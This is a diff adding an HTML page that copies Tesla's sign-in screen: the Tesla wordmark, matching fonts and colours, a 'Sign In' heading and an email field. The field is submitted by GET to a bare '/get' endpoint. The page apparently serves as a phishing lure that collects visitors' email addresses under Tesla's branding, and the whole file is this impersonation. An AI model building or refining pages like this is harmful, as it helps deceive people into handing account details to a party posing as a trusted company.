@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta name="viewport" content="device-width, initial-scale=1">
+  <style>
+    .sign-in-title {
+      /* text-align: center; */
+      font-size: 2rem;
+      font-weight: 600;
+      font-family: -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        "Helvetica Neue",
+        Arial,
+        sans-serif
+    }
+
+    .tesla-logo {
+      margin-left: 1.5rem;
+      margin-top: 1rem;
+      height: 56px;
+    }
+    @media (max-width: 1199px) { .tesla-logo { margin-left: 1.75rem; margin-top: 1rem; } }
+    @media (max-width: 1000px) { .tesla-logo { margin-left: 1.75rem; margin-top: 1rem; } }
+    @media (max-width: 599px) { .tesla-logo { margin-left: 1rem; margin-top: 1rem; } }
+    .tds-icon { width: 120px; height: 24px; }
+
+    label {
+      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+      font-size: 0.8rem;
+      font-weight: 500;
+      font-size: 14px;
+      color: #5c5e62;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .tds-form-label-tooltip {
+      display: inline-flex;
+      position: relative;
+      vertical-align: middle;
+      color: #5c5e62;
+    }
+    .tds-icon-info-small { width: 16px }
+    .tds-icon-info-small:hover { cursor: pointer; }
+    .tds-icon-info-small:focus { outline: none; }
+    .main-row * { display: block; }
+    .main-row {
+      display: grid;
+      margin-left: 41%;
+      width: 18%;
+    }
+    @media (max-width: 1199px) {  }
+    @media (max-width: 1000px) {}
+    @media (max-width: 599px) {}
+
+    input {
+      background-color: #f4f4f4;
+      font-size: 14px;
+      border: none;
+      outline: none;
+      line-height: 20px;
+      border-radius: 2px;
+      height: 2rem;
+      padding-left: 0.5rem;
+      font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+      font-size: 0.8rem;
+      font-weight: 500;
+      font-size: 14px;
+      color: #5c5e62;
+      -webkit-font-smoothing: antialiased;
+      margin-top: 1rem;
+    }
+    input:focus, input:target {
+      outline: 1px solid #c0c0c0;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="tesla-logo">
+      <svg class="tds-icon tds-icon-logo-wordmark tds-site-logo-icon" viewBox="0 0 342 35"
+        xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true">
+        <title>Tesla Logo</title>
+        <path
+          d="M0 .1a9.7 9.7 0 007 7h11l.5.1v27.6h6.8V7.3L26 7h11a9.8 9.8 0 007-7H0zm238.6 0h-6.8v34.8H263a9.7 9.7 0 006-6.8h-30.3V0zm-52.3 6.8c3.6-1 6.6-3.8 7.4-6.9l-38.1.1v20.6h31.1v7.2h-24.4a13.6 13.6 0 00-8.7 7h39.9v-21h-31.2v-7h24zm116.2 28h6.7v-14h24.6v14h6.7v-21h-38zM85.3 7h26a9.6 9.6 0 007.1-7H78.3a9.6 9.6 0 007 7zm0 13.8h26a9.6 9.6 0 007.1-7H78.3a9.6 9.6 0 007 7zm0 14.1h26a9.6 9.6 0 007.1-7H78.3a9.6 9.6 0 007 7zM308.5 7h26a9.6 9.6 0 007-7h-40a9.6 9.6 0 007 7z"
+          fill="var(--tds-icon--fill, var(--tds-color--black))"></path>
+      </svg>
+    </div>
+    <form action="/get" method="get" id="email-form-step" class="form">
+      <div class="main-row">
+        <h1 class="sign-in-title">Sign In</h1>
+        <label style="float: right; max-width: fit-content" for="email">Email
+          <span style="float: right; max-width: fit-content;" class="tds-form-label-tooltip">
+            <svg class="tds-icon-info-small" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" data-tds-tooltip-trigger="true" tabindex="0" role="img" aria-label="Email Address Tooltip">
+              <title>Email Address Tooltip</title>
+              <path d="M8 2a6 6 0 1 0 0 12A6 6 0 0 0 8 2zm0 10.5c-2.481 0-4.5-2.019-4.5-4.5S5.519 3.5 8 3.5s4.5 2.019 4.5 4.5-2.019 4.5-4.5 4.5zm.75-4v1.75a.75.75 0 0 1-1.5 0V8.5a.75.75 0 0 1 1.5 0zM9 6a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" fill="currentColor"></path>
+            </svg>
+          </span>
+        </label>
+        <input name="email" type="email"/>
+      </div>
+    </form>
+</div>
+</body>
+
+</html>
